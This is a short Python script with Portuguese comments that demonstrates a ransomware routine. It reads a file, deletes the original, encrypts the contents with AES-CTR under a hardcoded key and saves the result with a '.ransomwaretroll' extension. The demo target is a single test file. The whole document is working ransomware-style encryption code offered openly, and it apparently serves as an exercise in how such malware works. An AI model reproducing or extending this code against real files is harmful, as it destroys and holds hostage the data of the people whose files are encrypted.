import os
import pyaes

def encrypt_file(file_name, key):
    try:
        # Abrir o arquivo a ser criptografado
        with open(file_name, "rb") as file:
            file_data = file.read()

        # Remover o arquivo original
        os.remove(file_name)

        # Configurar o AES para criptografia
        aes = pyaes.AESModeOfOperationCTR(key)

        # Criptografar o arquivo
        crypto_data = aes.encrypt(file_data)

        # Nome do arquivo criptografado
        encrypted_file_name = f"{file_name}.ransomwaretroll"

        # Salvar o arquivo criptografado
        with open(encrypted_file_name, "wb") as new_file:
            new_file.write(crypto_data)

        print(f"Arquivo '{encrypted_file_name}' criptografado com sucesso.")

    except FileNotFoundError:
        print(f"Erro: O arquivo '{file_name}' não foi encontrado.")
    except Exception as e:
        print(f"Ocorreu um erro: {e}")

if __name__ == "__main__":
    # Nome do arquivo a ser criptografado
    file_to_encrypt = "teste.txt"

    # Chave para criptografia
    key = b"testeransomwares"

    # Chamar a função de criptografia
    encrypt_file(file_to_encrypt, key)
